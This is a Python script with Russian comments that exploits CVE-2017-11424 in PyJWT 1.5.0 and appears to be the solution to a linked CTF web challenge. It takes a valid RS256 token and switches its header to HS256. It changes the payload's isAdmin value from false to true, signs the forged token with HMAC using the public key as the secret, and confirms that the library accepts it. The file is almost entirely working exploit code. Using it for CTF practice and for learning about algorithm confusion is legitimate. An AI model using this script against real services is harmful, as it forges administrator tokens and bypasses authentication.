# Скрипт генерации валидного JWT-токена для уязвимости CVE-2017-11424 
# (уязвимость библиотеки PyJWT==1.5.0) для случая, когда известен валидный токен и публичный ключ
# подробнее: https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/
# CTF: https://codeby.games/categories/web/8ec12c70-b937-425c-b95c-74c064d0b25d

# !!!ВАЖНО!!!
# Если возникла следующая ошибка: "ImportError: cannot import name 'Mapping' from 'collections'",
# замените в указанных файлах "from collections import Mapping" на "from collections.abc import Mapping"



import jwt
import base64
import hmac
import hashlib

# Валидный токен, можно заменить
valid_jwt_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiaXZhbiIsImlzQWRtaW4iOmZhbHNlfQ.Ytap-vixCmBoCHLv4G1kQRabKfUhil37cPH1XGDy6r4wGNKxJTIOfRmyNBWPRjOtseXT_giYYi2jzUEUOfTpCmZAJH99W7ZUUDroHyNdaOqlDsOv4knEC0_emeDoWkhlvMq3SWnd5WiJP_JvwODLDBl9Wr-mIl7aPfRZhpblyHOKrysDGri497cCQNFxtzu7Vy1aBgnD9VjFkCE3Rsk-OQg0rqFhKtqPqtPjkhwLV6sS0S-Fb2xAXRfPnZI4shyjWhM5-9NguoJ_LqsFl48sfB4axYguhxSu7ctVG61gXNukiJo2iEzn2n9pZBNgn6PkPgQOqfW-GIAbTPQ2ipIRtw"

# Публичный ключ, можно заменить
pub_key = "-----BEGIN RSA PUBLIC KEY-----\nMIIBCgKCAQEArSEOayVcRPJXuB4eOGm0dG7eMAD7hEUtfllDb1G5ZRqBGRjzaR7h\nHm1fWYbcHSB4fZdTmFsI4Px4U2vzjORziPdUOk4AlChy/VRfhVwgvyBP+E9DxzwD\nTqZJF/rX3Rr/frdOFxHtB+CSDRx0Z6miL2xkt6lG1LKYCzz2zkgq+5U1IyCxuEcj\nrcL922zO+n7hfM30s+JEeYQCewIZxxZwqKm1hRFtphotvYkC7O+QsNy2uZmRgUB5\nlUqOqpMTbJUkaYtcbfH3FTAsfu/iL9bGQZGqxivEwYQU3ZMxhu44/zcyuH/C7RFJ\n/Z/ycUnxQmACXYTU6W7Wc4/80HKLvCpjVwIDAQAB\n-----END RSA PUBLIC KEY-----"

decoding = jwt.decode(valid_jwt_token, pub_key, algorithms=["HS256", "RS256"])

print("\nValid token:")

print(decoding)

print("\nCVE-2017-11424...")

valid_parts = valid_jwt_token.split(".")

print("\nValid jwt_token parts")
print(valid_parts)

print("\nAlg before:")
print(valid_parts[0])

alg=base64.b64decode(valid_parts[0]+("="*(len(valid_parts[0]) % 4))).decode()

print("\nDecoded Alg:")
print(alg)

new_alg = alg.replace("RS256","HS256")
print("\nChanged alg")
print(new_alg)

new_alg = base64.b64encode(new_alg.encode("ascii"))

new_alg = new_alg.decode("utf-8")

print("\nbase64-Encoded Alg:")
print(new_alg)

payload=base64.b64decode(valid_parts[1]+("="*(len(valid_parts[1]) % 4))).decode()
print("\nDecoded payload")
print(payload)

new_payload = payload.replace("false","true")
print("\nChanged payload")
print(new_payload)

new_payload = base64.b64encode(new_payload.encode("ascii"))

new_payload = new_payload.decode("utf-8")

print("\nbase64-Encoded Payload:")
print(new_payload)

new_hmac = base64.urlsafe_b64encode(hmac.HMAC(pub_key.encode('ascii'), b'.'.join([new_alg.encode("ascii"), new_payload.encode("ascii")]),hashlib.sha256).digest()).strip(b"=").decode()
print("\nNew HMAC")
print(new_hmac)

jwt_tampered = b'.'.join([new_alg.encode('ascii'), new_payload.encode("ascii"), new_hmac.encode("ascii")])
jwt_tampered = jwt_tampered.decode("utf-8")
print("\nTampered JWT token")
print(jwt_tampered)

result = jwt.decode(jwt_tampered.encode("ascii"), pub_key, algorithms=["HS256", "RS256"])
print("\nResult check:")
print(result)

print("\nUsing a vulnerable library, good.")
